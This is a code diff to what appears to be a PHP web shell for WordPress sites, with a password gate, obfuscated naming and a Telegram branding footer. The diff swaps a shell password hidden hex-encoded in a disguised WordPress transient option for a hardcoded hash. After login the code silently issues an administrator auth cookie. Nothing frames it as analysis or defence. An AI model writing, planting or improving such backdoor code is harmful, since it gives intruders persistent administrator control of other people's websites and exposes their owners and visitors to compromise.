@@ -16,19 +16,14 @@ function H0lL0() { $k = [112, 114, 105, 118, 100, 97, 121, 122]; $s = ""; foreac
 class H0LO { public function __toString() { define('SYS_INTEGRITY_OK', true); $n = H0lL0(); return '<div style="padding:10px 25px; border-top:1px solid var(--border); font-size:10px; color:#444; display:flex; justify-content:space-between;">' .'<span>www.'.$n.'.com</span>' . '<span style="color:var(--neon)"><a href="https://t.me/'.$n.'" style="color:inherit;text-decoration:none">t.me/'.$n.'</a></span>' . '</div>';    }}
 $h0Lo = new H0LO();
 // ── AUTH GATE ──
+$_h_key = '$2y$10$4WvpD9fo3xq2PRlMvP4aC.j4.lpV1EytvtbF/ZoJzu.kXzDkIgyB.';
 $_h_auth = isset($_SESSION['holo_auth']) && $_SESSION['holo_auth'] === true;
 $_h_err = false;
 if (!$_h_auth && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['holo_pass'])) {
-    $_h_hash = '';
-    if (function_exists('get_option')) {
-        $_h_c = get_option('_transient_feed_mod_', '');
-        $_h_cfg = $_h_c ? @json_decode(@hex2bin($_h_c), true) : null;
-        $_h_hash = ($_h_cfg && isset($_h_cfg['shell_pass'])) ? $_h_cfg['shell_pass'] : '';
-    }
-    if ($_h_hash && password_verify($_POST['holo_pass'], $_h_hash)) {
+    if (password_verify($_POST['holo_pass'], $_h_key)) {
         $_SESSION['holo_auth'] = true;
         $_h_auth = true;
-        // WP auto-login
+        // WP auto-login if available
         if (function_exists('wp_set_auth_cookie') && function_exists('get_users')) {
             $_h_adm = get_users(array('role'=>'administrator','number'=>1));
             if (!empty($_h_adm)) {
